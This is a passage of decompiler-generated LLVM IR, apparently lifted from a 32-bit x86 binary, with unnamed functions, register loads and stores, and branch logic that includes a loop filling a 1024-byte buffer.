  store i32 %v0_8049333, i32* %v3_8049333, align 4
  %v0_8049334 = call i32 @function_80518a0()
  store i32 %v0_8049334, i32* %eax.global-to-local, align 4
  %v0_8049339 = load i32, i32* @esp, align 4
  %v1_8049339 = add i32 %v0_8049339, 16
  %v3_804933c = trunc i32 %v0_8049334 to i8
  %v4_804933c = icmp eq i8 %v3_804933c, 0
  store i1 %v4_804933c, i1* %zf.global-to-local, align 1
  %v1_804933e = icmp eq i1 %v4_804933c, false
  br i1 %v1_804933e, label %dec_label_pc_8049301, label %dec_label_pc_8049340

dec_label_pc_8049340:                             ; preds = %dec_label_pc_8049322
  %v1_8049340 = add i32 %v0_8049339, 20916
  %v2_8049340 = inttoptr i32 %v1_8049340 to i32*
  %v3_8049340 = load i32, i32* %v2_8049340, align 4
  store i32 %v3_8049340, i32* %eax.global-to-local, align 4
  %v1_8049347 = add i32 %v0_8049339, 108
  %v2_8049347 = inttoptr i32 %v1_8049347 to i32*
  %v3_8049347 = load i32, i32* %v2_8049347, align 4
  store i32 %v3_8049347, i32* %ecx.global-to-local, align 4
  %v1_804934b = add i32 %v3_8049340, 1
  store i32 %v1_804934b, i32* %eax.global-to-local, align 4
  store i32 %v1_804934b, i32* %v2_8049340, align 4
  %v0_8049353 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049353 = add i32 %v0_8049353, 16
  %v2_8049353 = inttoptr i32 %v1_8049353 to i32*
  %v3_8049353 = load i32, i32* %v2_8049353, align 4
  %v4_8049353 = load i32, i32* %eax.global-to-local, align 4
  %v5_8049353 = sub i32 %v3_8049353, %v4_8049353
  %v11_8049353 = xor i32 %v4_8049353, %v3_8049353
  %v12_8049353 = xor i32 %v5_8049353, %v3_8049353
  %v13_8049353 = and i32 %v12_8049353, %v11_8049353
  %v14_8049353 = icmp slt i32 %v13_8049353, 0
  %v15_8049353 = icmp eq i32 %v5_8049353, 0
  store i1 %v15_8049353, i1* %zf.global-to-local, align 1
  %v16_8049353 = icmp slt i32 %v5_8049353, 0
  %v3_8049356 = icmp eq i1 %v16_8049353, %v14_8049353
  %v4_8049356 = icmp eq i1 %v15_8049353, false
  %v5_8049356 = and i1 %v4_8049356, %v3_8049356
  br i1 %v5_8049356, label %dec_label_pc_8049322, label %dec_label_pc_8049358

dec_label_pc_8049358:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_804930a
  %v0_8049358 = load i32, i32* @esp, align 4
  %v9_8049358 = icmp eq i32 %v0_8049358, 12
  store i1 %v9_8049358, i1* %zf.global-to-local, align 1
  %v0_804935b = load i32, i32* @esi, align 4
  %v2_804935b = add i32 %v0_8049358, -16
  %v3_804935b = inttoptr i32 %v2_804935b to i32*
  store i32 %v0_804935b, i32* %v3_804935b, align 4
  %v2_804935c = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v0_8049361 = load i32, i32* @esp, align 4
  %v1_8049361 = add i32 %v0_8049361, 16
  %v1_8049364 = add i32 %v2_804935c, -127
  %v6_8049364 = sub i32 126, %v2_804935c
  %v7_8049364 = and i32 %v6_8049364, %v2_804935c
  %v8_8049364 = icmp slt i32 %v7_8049364, 0
  %v9_8049364 = icmp eq i32 %v1_8049364, 0
  store i1 %v9_8049364, i1* %zf.global-to-local, align 1
  %v10_8049364 = icmp slt i32 %v1_8049364, 0
  %v3_8049367 = icmp eq i1 %v10_8049364, %v8_8049364
  %v4_8049367 = icmp eq i1 %v9_8049364, false
  %v5_8049367 = and i1 %v4_8049367, %v3_8049367
  br i1 %v5_8049367, label %dec_label_pc_8049301, label %dec_label_pc_8049369

dec_label_pc_8049369:                             ; preds = %dec_label_pc_8049358
  %v0_8049369 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049369 = add i32 %v0_8049361, 12
  %v3_8049369 = inttoptr i32 %v2_8049369 to i32*
  store i32 %v0_8049369, i32* %v3_8049369, align 4
  %v0_804936a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804936a = add i32 %v0_8049361, 8
  %v3_804936a = inttoptr i32 %v2_804936a to i32*
  store i32 %v0_804936a, i32* %v3_804936a, align 4
  %v0_804936b = load i32, i32* @esi, align 4
  %v2_804936b = add i32 %v0_8049361, 4
  %v3_804936b = inttoptr i32 %v2_804936b to i32*
  store i32 %v0_804936b, i32* %v3_804936b, align 4
  %v1_804936c = add i32 %v0_8049361, 108
  %v2_804936c = inttoptr i32 %v1_804936c to i32*
  %v3_804936c = load i32, i32* %v2_804936c, align 4
  store i32 %v3_804936c, i32* %edx.global-to-local, align 4
  %v1_8049370 = add i32 %v0_8049361, 92
  %v2_8049370 = inttoptr i32 %v1_8049370 to i32*
  %v3_8049370 = load i32, i32* %v2_8049370, align 4
  store i32 %v3_8049370, i32* %ecx.global-to-local, align 4
  %v1_8049374 = add i32 %v3_804936c, 16
  %v2_8049374 = inttoptr i32 %v1_8049374 to i32*
  %v3_8049374 = load i32, i32* %v2_8049374, align 4
  %v2_8049377 = mul i32 %v3_8049374, 128
  %v3_8049377 = icmp eq i32 %v2_8049377, 0
  store i1 %v3_8049377, i1* %zf.global-to-local, align 1
  %v2_804937a = add i32 %v3_8049370, 1472
  %v3_804937a = add i32 %v2_804937a, %v2_8049377
  store i32 %v3_804937a, i32* %eax.global-to-local, align 4
  %v3_8049381 = inttoptr i32 %v0_8049361 to i32*
  store i32 %v3_804937a, i32* %v3_8049381, align 4
  %v3_8049382 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049382, i32* %eax.global-to-local, align 4
  %v0_8049387 = load i32, i32* @esp, align 4
  %v1_8049387 = add i32 %v0_8049387, 108
  %v2_8049387 = inttoptr i32 %v1_8049387 to i32*
  %v3_8049387 = load i32, i32* %v2_8049387, align 4
  store i32 %v3_8049387, i32* %eax.global-to-local, align 4
  %v1_804938e = add i32 %v3_8049387, 16
  %v2_804938e = inttoptr i32 %v1_804938e to i32*
  %v3_804938e = load i32, i32* %v2_804938e, align 4
  %v1_8049391 = add i32 %v3_804938e, 1
  %v8_8049391 = icmp eq i32 %v1_8049391, 0
  store i1 %v8_8049391, i1* %zf.global-to-local, align 1
  store i32 %v1_8049391, i32* %edx.global-to-local, align 4
  store i32 %v1_8049391, i32* %v2_804938e, align 4
  %v0_8049301.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049301

dec_label_pc_804939a:                             ; preds = %dec_label_pc_804921b
  %v0_804939a = load i32, i32* %eax.global-to-local, align 4
  %v1_804939a = add i32 %v0_804939a, 1
  %v8_804939a = icmp eq i32 %v1_804939a, 0
  store i1 %v8_804939a, i1* %zf.global-to-local, align 1
  store i32 %v1_804939a, i32* %eax.global-to-local, align 4
  %v0_804939b = load i32, i32* @esi, align 4
  %v2_804939b = add i32 %v0_804939b, %v1_804939a
  store i32 %v2_804939b, i32* %ecx.global-to-local, align 4
  %v2_804939e = add i32 %v0_804923c, 124
  %v3_804939e = inttoptr i32 %v2_804939e to i32*
  store i32 %v2_804939b, i32* %v3_804939e, align 4
  %v0_804924d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804924d

dec_label_pc_80493a7:                             ; preds = %dec_label_pc_8048547
  %v1_80493a7 = add i32 %v0_80485a5, -1440
  %v2_80493a7 = inttoptr i32 %v1_80493a7 to i32*
  %v3_80493a7 = load i32, i32* %v2_80493a7, align 4
  %v1_80493af = urem i32 %v3_80493a7, 32
  store i32 %v1_80493af, i32* %eax.global-to-local, align 4
  %v2_80493b2 = udiv i32 %v3_80493a7, 32
  store i32 %v2_80493b2, i32* %edx.global-to-local, align 4
  %v0_80493b5 = load i32, i32* @esp, align 4
  %v2_80493b5 = mul nuw nsw i32 %v2_80493b2, 4
  %v3_80493b5 = add nuw nsw i32 %v2_80493b5, 20740
  %v4_80493b5 = add i32 %v3_80493b5, %v0_80493b5
  %v5_80493b5 = inttoptr i32 %v4_80493b5 to i32*
  %v6_80493b5 = load i32, i32* %v5_80493b5, align 4
  %v9_80493b5 = shl i32 1, %v1_80493af
  %v12_80493b5 = or i32 %v6_80493b5, %v9_80493b5
  store i32 %v12_80493b5, i32* %v5_80493b5, align 4
  %v0_80493bd = load i32, i32* @esi, align 4
  %v1_80493bd = add i32 %v0_80493bd, -1440
  %v2_80493bd = inttoptr i32 %v1_80493bd to i32*
  %v3_80493bd = load i32, i32* %v2_80493bd, align 4
  store i32 %v3_80493bd, i32* %eax.global-to-local, align 4
  %v1_80493c3 = load i32, i32* @esp, align 4
  %v2_80493c3 = add i32 %v1_80493c3, 72
  %v3_80493c3 = inttoptr i32 %v2_80493c3 to i32*
  %v4_80493c3 = load i32, i32* %v3_80493c3, align 4
  %v5_80493c3 = sub i32 %v3_80493bd, %v4_80493c3
  %v11_80493c3 = xor i32 %v4_80493c3, %v3_80493bd
  %v12_80493c3 = xor i32 %v5_80493c3, %v3_80493bd
  %v13_80493c3 = and i32 %v12_80493c3, %v11_80493c3
  %v14_80493c3 = icmp slt i32 %v13_80493c3, 0
  %v15_80493c3 = icmp eq i32 %v5_80493c3, 0
  store i1 %v15_80493c3, i1* %zf.global-to-local, align 1
  %v16_80493c3 = icmp slt i32 %v5_80493c3, 0
  %v3_80493c7 = icmp ne i1 %v16_80493c3, %v14_80493c3
  %v4_80493c7 = or i1 %v15_80493c3, %v3_80493c7
  br i1 %v4_80493c7, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80493d2:                             ; preds = %dec_label_pc_804920d, %dec_label_pc_80491e0
  %v0_80493d2 = load i32, i32* @edi, align 4
  %v2_80493d2 = add i32 %v0_8049203, 12
  %v3_80493d2 = inttoptr i32 %v2_80493d2 to i32*
  store i32 %v0_80493d2, i32* %v3_80493d2, align 4
  %v0_80493d3 = load i32, i32* @edi, align 4
  %v2_80493d3 = add i32 %v0_8049203, 8
  %v3_80493d3 = inttoptr i32 %v2_80493d3 to i32*
  store i32 %v0_80493d3, i32* %v3_80493d3, align 4
  %v1_80493d4 = add i32 %v0_8049203, 4
  %v2_80493d4 = inttoptr i32 %v1_80493d4 to i32*
  store i32 0, i32* %v2_80493d4, align 4
  %v2_80493d6 = inttoptr i32 %v0_8049203 to i32*
  store i32 38, i32* %v2_80493d6, align 4
  %v3_80493d8 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80493d8, i32* %eax.global-to-local, align 4
  %v0_80493dd = load i32, i32* @esp, align 4
  %v9_80493dd = icmp eq i32 %v0_80493dd, -12
  store i1 %v9_80493dd, i1* %zf.global-to-local, align 1
  %v2_80493e0 = add i32 %v0_80493dd, 8
  %v3_80493e0 = inttoptr i32 %v2_80493e0 to i32*
  store i32 %v3_80493d8, i32* %v3_80493e0, align 4
  %v1_80493e1 = add i32 %v0_80493dd, 120
  %v2_80493e1 = inttoptr i32 %v1_80493e1 to i32*
  %v3_80493e1 = load i32, i32* %v2_80493e1, align 4
  %v2_80493e5 = add i32 %v0_80493dd, 4
  %v3_80493e5 = inttoptr i32 %v2_80493e5 to i32*
  store i32 %v3_80493e1, i32* %v3_80493e5, align 4
  %v1_80493e6 = add i32 %v0_80493dd, 147
  store i32 %v1_80493e6, i32* @ecx, align 4
  %v3_80493ed = inttoptr i32 %v0_80493dd to i32*
  store i32 %v1_80493e6, i32* %v3_80493ed, align 4
  %v4_80493ee = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80493f3 = load i32, i32* @esp, align 4
  %v1_80493f6 = add i32 %v4_80493ee, 1
  %v8_80493f6 = icmp eq i32 %v1_80493f6, 0
  store i1 %v8_80493f6, i1* %zf.global-to-local, align 1
  store i32 %v1_80493f6, i32* %eax.global-to-local, align 4
  br i1 %v8_80493f6, label %dec_label_pc_8049854, label %dec_label_pc_80493fd

dec_label_pc_80493fd:                             ; preds = %dec_label_pc_80493d2
  %v0_80493fd = load i32, i32* @ebx, align 4
  %v2_80493fd = add i32 %v0_80493f3, 12
  %v3_80493fd = inttoptr i32 %v2_80493fd to i32*
  store i32 %v0_80493fd, i32* %v3_80493fd, align 4
  %v0_80493fe = load i32, i32* @ebx, align 4
  %v2_80493fe = add i32 %v0_80493f3, 8
  %v3_80493fe = inttoptr i32 %v2_80493fe to i32*
  store i32 %v0_80493fe, i32* %v3_80493fe, align 4
  %v1_80493ff = add i32 %v0_80493f3, 4
  %v2_80493ff = inttoptr i32 %v1_80493ff to i32*
  store i32 0, i32* %v2_80493ff, align 4
  %v2_8049401 = inttoptr i32 %v0_80493f3 to i32*
  store i32 38, i32* %v2_8049401, align 4
  %v3_8049403 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049403, i32* %eax.global-to-local, align 4
  %v0_8049408 = load i32, i32* @esp, align 4
  %v9_8049408 = icmp eq i32 %v0_8049408, -12
  store i1 %v9_8049408, i1* %zf.global-to-local, align 1
  %v2_804940b = add i32 %v0_8049408, 8
  %v3_804940b = inttoptr i32 %v2_804940b to i32*
  store i32 %v3_8049403, i32* %v3_804940b, align 4
  %v1_804940c = add i32 %v0_8049408, 120
  %v2_804940c = inttoptr i32 %v1_804940c to i32*
  %v3_804940c = load i32, i32* %v2_804940c, align 4
  store i32 %v3_804940c, i32* @ecx, align 4
  %v2_8049410 = add i32 %v0_8049408, 4
  %v3_8049410 = inttoptr i32 %v2_8049410 to i32*
  store i32 %v3_804940c, i32* %v3_8049410, align 4
  %v1_8049411 = add i32 %v0_8049408, 147
  store i32 %v1_8049411, i32* %eax.global-to-local, align 4
  %v3_8049418 = inttoptr i32 %v0_8049408 to i32*
  store i32 %v1_8049411, i32* %v3_8049418, align 4
  %v4_8049419 = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049419, i32* %eax.global-to-local, align 4
  %v0_804941e = load i32, i32* @esp, align 4
  %v6_804941e = icmp eq i32 %v0_804941e, -16
  store i1 %v6_804941e, i1* %zf.global-to-local, align 1
  store i32 %v4_8049419, i32* %ebx.global-to-local, align 4
  %v3_8049423 = add i32 %v4_8049419, 147
  %v4_8049423 = add i32 %v3_8049423, %v0_804941e
  %v5_8049423 = inttoptr i32 %v4_8049423 to i8*
  %v6_8049423 = load i8, i8* %v5_8049423, align 1
  %v12_8049423 = icmp eq i8 %v6_8049423, 32
  %v1_804942b = zext i1 %v12_8049423 to i32
  %v1_804942e = add i32 %v0_804941e, 147
  store i32 %v1_804942e, i32* %esi.global-to-local, align 4
  store i32 %v1_804942b, i32* %eax.global-to-local, align 4
  %v1_804943a = add i32 %v0_804941e, 12
  %v2_804943a = inttoptr i32 %v1_804943a to i32*
  store i32 2, i32* %v2_804943a, align 4
  %v1_804943c = add i32 %v0_804941e, 8
  %v2_804943c = inttoptr i32 %v1_804943c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_804943c, align 4
  %v0_8049441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049441 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049441 = add i32 %v1_8049441, %v0_8049441
  store i32 %v2_8049441, i32* @ebx, align 4
  %v1_8049443 = add i32 %v0_804941e, 120
  %v2_8049443 = inttoptr i32 %v1_8049443 to i32*
  %v3_8049443 = load i32, i32* %v2_8049443, align 4
  %v2_8049447 = sub i32 %v3_8049443, %v2_8049441
  store i32 %v2_8049447, i32* %eax.global-to-local, align 4
  %v0_8049449 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049449 = add i32 %v0_8049449, %v2_8049441
  %v12_8049449 = icmp eq i32 %v2_8049449, 0
  store i1 %v12_8049449, i1* %zf.global-to-local, align 1
  store i32 %v2_8049449, i32* @esi, align 4
  %v2_804944b = add i32 %v0_804941e, 4
  %v3_804944b = inttoptr i32 %v2_804944b to i32*
  store i32 %v2_8049447, i32* %v3_804944b, align 4
  %v0_804944c = load i32, i32* @esi, align 4
  %v3_804944c = inttoptr i32 %v0_804941e to i32*
  store i32 %v0_804944c, i32* %v3_804944c, align 4
  %v0_804944d = call i32 @function_8051590()
  store i32 %v0_804944d, i32* %eax.global-to-local, align 4
  %v0_8049452 = load i32, i32* @esp, align 4
  store i32 %v0_804944d, i32* %edx.global-to-local, align 4
  %v10_8049457 = icmp eq i32 %v0_804944d, -1
  store i1 %v10_8049457, i1* %zf.global-to-local, align 1
  br i1 %v10_8049457, label %dec_label_pc_8049854, label %dec_label_pc_8049460

dec_label_pc_8049460:                             ; preds = %dec_label_pc_80493fd
  %v10_8049460 = icmp eq i32 %v0_804944d, 1
  store i1 %v10_8049460, i1* %zf.global-to-local, align 1
  %v7_8049463 = icmp sgt i32 %v0_804944d, 1
  br i1 %v7_8049463, label %dec_label_pc_8049465, label %dec_label_pc_8049468

dec_label_pc_8049465:                             ; preds = %dec_label_pc_8049460
  %v1_8049465 = add i32 %v0_804944d, -2
  %v9_8049465 = icmp eq i32 %v1_8049465, 0
  store i1 %v9_8049465, i1* %zf.global-to-local, align 1
  store i32 %v1_8049465, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049468

dec_label_pc_8049468:                             ; preds = %dec_label_pc_8049460, %dec_label_pc_8049465
  %v0_8049471 = phi i32 [ %v0_804944d, %dec_label_pc_8049460 ], [ %v1_8049465, %dec_label_pc_8049465 ]
  %v1_8049468 = add i32 %v0_8049452, 20920
  %v1_804946f = load i32, i32* @ebx, align 4
  %v2_804946f = add i32 %v1_8049468, %v1_804946f
  %v12_804946f = icmp eq i32 %v2_804946f, 0
  store i1 %v12_804946f, i1* %zf.global-to-local, align 1
  store i32 %v2_804946f, i32* %eax.global-to-local, align 4
  %v1_8049471 = add i32 %v0_8049471, 1
  store i32 %v1_8049471, i32* @ebx, align 4
  %v2_8049474 = add i32 %v0_8049471, -20773
  %v3_8049474 = add i32 %v2_8049474, %v2_804946f
  %v4_8049474 = inttoptr i32 %v3_8049474 to i8*
  store i8 0, i8* %v4_8049474, align 1
  %v0_804947c = load i32, i32* @esp, align 4
  %v1_804947c = add i32 %v0_804947c, -4
  %v2_804947c = inttoptr i32 %v1_804947c to i32*
  store i32 4, i32* %v2_804947c, align 4
  %v1_804947e = add i32 %v0_804947c, -8
  %v2_804947e = inttoptr i32 %v1_804947e to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80543ab.15 to i32), i32* %v2_804947e, align 4
  %v0_8049483 = load i32, i32* @ebx, align 4
  %v2_8049483 = add i32 %v0_804947c, -12
  %v3_8049483 = inttoptr i32 %v2_8049483 to i32*
  store i32 %v0_8049483, i32* %v3_8049483, align 4
  %v0_8049484 = load i32, i32* @esi, align 4
  %v2_8049484 = add i32 %v0_804947c, -16
  %v3_8049484 = inttoptr i32 %v2_8049484 to i32*
  store i32 %v0_8049484, i32* %v3_8049484, align 4
  %v0_8049485 = call i32 @function_8051590()
  store i32 %v0_8049485, i32* @eax, align 4
  %v0_804948a = load i32, i32* @esp, align 4
  %v9_804948d = icmp eq i32 %v0_8049485, 4
  store i1 %v9_804948d, i1* %zf.global-to-local, align 1
  br i1 %v9_804948d, label %dec_label_pc_8049b1d, label %dec_label_pc_8049496

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049468
  %v1_804948a = add i32 %v0_804948a, 16
  %v0_8049496 = load i32, i32* @esi, align 4
  %v1_8049496 = inttoptr i32 %v0_8049496 to i8*
  %v2_8049496 = load i8, i8* %v1_8049496, align 1
  %v11_8049496 = icmp eq i8 %v2_8049496, 47
  store i1 %v11_8049496, i1* %zf.global-to-local, align 1
  br i1 %v11_8049496, label %dec_label_pc_8049c88, label %dec_label_pc_804949f

dec_label_pc_804949f:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049c88, %dec_label_pc_8049bdf, %dec_label_pc_8049bbc, %dec_label_pc_8049496, %dec_label_pc_8049c14
  %v0_804949f = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049cb2, %dec_label_pc_8049c88 ], [ %v1_8049c09, %dec_label_pc_8049bdf ], [ %v1_8049bd1, %dec_label_pc_8049bbc ], [ %v1_804948a, %dec_label_pc_8049496 ], [ %v1_8049c29, %dec_label_pc_8049c14 ]
  %v1_804949f = add i32 %v0_804949f, 92
  %v2_804949f = inttoptr i32 %v1_804949f to i32*
  %v3_804949f = load i32, i32* %v2_804949f, align 4
  store i32 %v3_804949f, i32* %edx.global-to-local, align 4
  %v1_80494a3 = add i32 %v3_804949f, -1448
  %v2_80494a3 = inttoptr i32 %v1_80494a3 to i8*
  store i8 1, i8* %v2_80494a3, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80494af:                             ; preds = %dec_label_pc_8048d81
  %v1_80494af = call i32 @function_8051fb9(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80494af, i32* %eax.global-to-local, align 4
  %v0_80494b4 = load i32, i32* @esp, align 4
  %v1_80494b4 = add i32 %v0_80494b4, 76
  %v2_80494b4 = inttoptr i32 %v1_80494b4 to i32*
  %v3_80494b4 = load i32, i32* %v2_80494b4, align 4
  store i32 %v3_80494b4, i32* %ecx.global-to-local, align 4
  %v1_80494b8 = add i32 %v0_80494b4, 92
  %v2_80494b8 = inttoptr i32 %v1_80494b8 to i32*
  %v3_80494b8 = load i32, i32* %v2_80494b8, align 4
  store i32 %v3_80494b8, i32* %edx.global-to-local, align 4
  %v1_80494be = add i32 %v3_80494b4, 1472
  store i32 %v1_80494be, i32* @ebp, align 4
  store i32 %v1_80494af, i32* @edi, align 4
  %v1_80494c6 = add i32 %v3_80494b4, 2116
  store i32 %v1_80494c6, i32* @esi, align 4
  %v1_80494cc = add i32 %v3_80494b8, 660
  %v2_80494cc = inttoptr i32 %v1_80494cc to i32*
  %v3_80494cc = load i32, i32* %v2_80494cc, align 4
  %v9_80494cc = icmp eq i32 %v3_80494cc, 1024
  store i1 %v9_80494cc, i1* %zf.global-to-local, align 1
  br i1 %v9_80494cc, label %dec_label_pc_8049605, label %dec_label_pc_80494dc

dec_label_pc_80494dc:                             ; preds = %dec_label_pc_80494af, %dec_label_pc_8049605, %dec_label_pc_80495f1
  %v0_80494dc = phi i32 [ %v0_80495e0, %dec_label_pc_80495f1 ], [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80494dc.pre.pre, %dec_label_pc_8049605 ]
  %v1_80494dc = add i32 %v0_80494dc, 92
  %v2_80494dc = inttoptr i32 %v1_80494dc to i32*
  %v3_80494dc = load i32, i32* %v2_80494dc, align 4
  store i32 %v3_80494dc, i32* %eax.global-to-local, align 4
  %v0_80494e0 = load i32, i32* @edi, align 4
  %v1_80494e0 = inttoptr i32 %v0_80494e0 to i32*
  store i32 0, i32* %v1_80494e0, align 4
  %v0_80494e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494e6 = add i32 %v0_80494e6, 660
  %v2_80494e6 = inttoptr i32 %v1_80494e6 to i32*
  %v3_80494e6 = load i32, i32* %v2_80494e6, align 4
  store i32 %v3_80494e6, i32* %edx.global-to-local, align 4
  %v2_80494f1 = sub i32 1024, %v3_80494e6
  %v12_80494f1 = icmp eq i32 %v2_80494f1, 0
  store i1 %v12_80494f1, i1* %zf.global-to-local, align 1
  store i32 %v2_80494f1, i32* %eax.global-to-local, align 4
  %v0_80494f3 = load i32, i32* @esp, align 4
  %v1_80494f3 = add i32 %v0_80494f3, -4
  %v2_80494f3 = inttoptr i32 %v1_80494f3 to i32*
  store i32 16384, i32* %v2_80494f3, align 4
  %v0_80494f8 = load i32, i32* @esi, align 4
  %v1_80494f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80494f8 = add i32 %v1_80494f8, %v0_80494f8
  store i32 %v2_80494f8, i32* %edx.global-to-local, align 4
  %v0_80494fb = load i32, i32* %eax.global-to-local, align 4
  %v2_80494fb = add i32 %v0_80494f3, -8
  %v3_80494fb = inttoptr i32 %v2_80494fb to i32*
  store i32 %v0_80494fb, i32* %v3_80494fb, align 4
  %v0_80494fc = load i32, i32* %edx.global-to-local, align 4
  %v2_80494fc = add i32 %v0_80494f3, -12
  %v3_80494fc = inttoptr i32 %v2_80494fc to i32*
  store i32 %v0_80494fc, i32* %v3_80494fc, align 4
  %v1_80494fd = add i32 %v0_80494f3, 92
  %v2_80494fd = inttoptr i32 %v1_80494fd to i32*
  %v3_80494fd = load i32, i32* %v2_80494fd, align 4
  store i32 %v3_80494fd, i32* %edx.global-to-local, align 4
  %v1_8049501 = add i32 %v3_80494fd, -1452
  %v2_8049501 = inttoptr i32 %v1_8049501 to i32*
  %v3_8049501 = load i32, i32* %v2_8049501, align 4
  store i32 %v3_8049501, i32* %eax.global-to-local, align 4
  %v2_8049507 = add i32 %v0_80494f3, -16
  %v3_8049507 = inttoptr i32 %v2_8049507 to i32*
  store i32 %v3_8049501, i32* %v3_8049507, align 4
  %v0_8049508 = call i32 @function_805214e()
  store i32 %v0_8049508, i32* %eax.global-to-local, align 4
  %v0_804950d = load i32, i32* @esp, align 4
  %v1_804950d = add i32 %v0_804950d, 16
  %v1_8049510 = icmp eq i32 %v0_8049508, 0
  store i1 %v1_8049510, i1* %zf.global-to-local, align 1
  br i1 %v1_8049510, label %dec_label_pc_8048e44, label %dec_label_pc_8049518

dec_label_pc_8049518:                             ; preds = %dec_label_pc_80494dc
  %v10_8049518 = icmp eq i32 %v0_8049508, -1
  store i1 %v10_8049518, i1* %zf.global-to-local, align 1
  br i1 %v10_8049518, label %dec_label_pc_8049b0f, label %dec_label_pc_8049521

dec_label_pc_8049521:                             ; preds = %dec_label_pc_8049518
  %v1_8049521 = add i32 %v0_804950d, 108
  %v2_8049521 = inttoptr i32 %v1_8049521 to i32*
  %v3_8049521 = load i32, i32* %v2_8049521, align 4
  store i32 %v3_8049521, i32* %edx.global-to-local, align 4
  %v1_8049525 = add i32 %v3_8049521, 660
  %v2_8049525 = inttoptr i32 %v1_8049525 to i32*
  %v3_8049525 = load i32, i32* %v2_8049525, align 4
  %v2_804952b = add i32 %v3_8049525, %v0_8049508
  %v12_804952b = icmp eq i32 %v2_804952b, 0
  store i1 %v12_804952b, i1* %zf.global-to-local, align 1
  store i32 %v2_804952b, i32* %ecx.global-to-local, align 4
  store i32 %v2_804952b, i32* %v2_8049525, align 4
  %v0_8049533 = load i32, i32* @esp, align 4
  %v1_8049533 = add i32 %v0_8049533, 116
  %v2_8049533 = inttoptr i32 %v1_8049533 to i32*
  %v3_8049533 = load i32, i32* %v2_8049533, align 4
  store i32 %v3_8049533, i32* %ecx.global-to-local, align 4
  %v1_8049537 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049537 = add i32 %v1_8049537, -1444
  %v3_8049537 = inttoptr i32 %v2_8049537 to i32*
  store i32 %v3_8049533, i32* %v3_8049537, align 4
  %v0_80495d1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_8049542:                             ; preds = %dec_label_pc_80495d1
  %v1_8049542 = add i32 %v0_8049542, 660
  %v2_8049542 = inttoptr i32 %v1_8049542 to i32*
  %v3_8049542 = load i32, i32* %v2_8049542, align 4
  store i32 %v3_8049542, i32* %edx.global-to-local, align 4
  store i32 %v3_80495d1, i32* @ebx, align 4
  %v2_804954a = sub i32 %v3_80495d1, %v3_8049542
  %v8_804954a = xor i32 %v3_8049542, %v3_80495d1
  %v9_804954a = xor i32 %v2_804954a, %v3_80495d1
  %v10_804954a = and i32 %v9_804954a, %v8_804954a
  %v11_804954a = icmp slt i32 %v10_804954a, 0
  %v12_804954a = icmp eq i32 %v2_804954a, 0
  store i1 %v12_804954a, i1* %zf.global-to-local, align 1
  %v13_804954a = icmp slt i32 %v2_804954a, 0
  %v3_804954c = icmp ne i1 %v13_804954a, %v11_804954a
  %v4_804954c = or i1 %v12_804954a, %v3_804954c
  br i1 %v4_804954c, label %dec_label_pc_8049550, label %dec_label_pc_804954e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_8049542
  store i32 %v3_8049542, i32* @ebx, align 4
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %dec_label_pc_8049542, %dec_label_pc_804954e
  %v1_8049554 = phi i32 [ %v3_80495d1, %dec_label_pc_8049542 ], [ %v3_8049542, %dec_label_pc_804954e ]
  %v0_8049550 = load i32, i32* @esp, align 4
  %v1_8049550 = add i32 %v0_8049550, 92
  %v2_8049550 = inttoptr i32 %v1_8049550 to i32*
  %v3_8049550 = load i32, i32* %v2_8049550, align 4
  store i32 %v3_8049550, i32* %edx.global-to-local, align 4
  %v2_8049554 = sub i32 %v3_80495d1, %v1_8049554
  store i32 %v2_8049554, i32* %eax.global-to-local, align 4
  %v2_8049556 = add i32 %v3_8049550, 12
  %v3_8049556 = inttoptr i32 %v2_8049556 to i32*
  store i32 %v2_8049554, i32* %v3_8049556, align 4
  %v0_8049559 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049559 = inttoptr i32 %v0_8049559 to i32*
  %v2_8049559 = load i32, i32* %v1_8049559, align 4
  %v11_8049559 = icmp eq i32 %v2_8049559, 1
  store i1 %v11_8049559, i1* %zf.global-to-local, align 1
  br i1 %v11_8049559, label %dec_label_pc_8049636, label %dec_label_pc_8049562

dec_label_pc_8049562:                             ; preds = %dec_label_pc_8049550, %dec_label_pc_8049636, %dec_label_pc_80495dc
  %v0_8049562 = load i32, i32* @esp, align 4
  %v1_8049562 = add i32 %v0_8049562, 92
  %v2_8049562 = inttoptr i32 %v1_8049562 to i32*
  %v3_8049562 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049562, i32* %ecx.global-to-local, align 4
  %v1_8049566 = add i32 %v3_8049562, 12
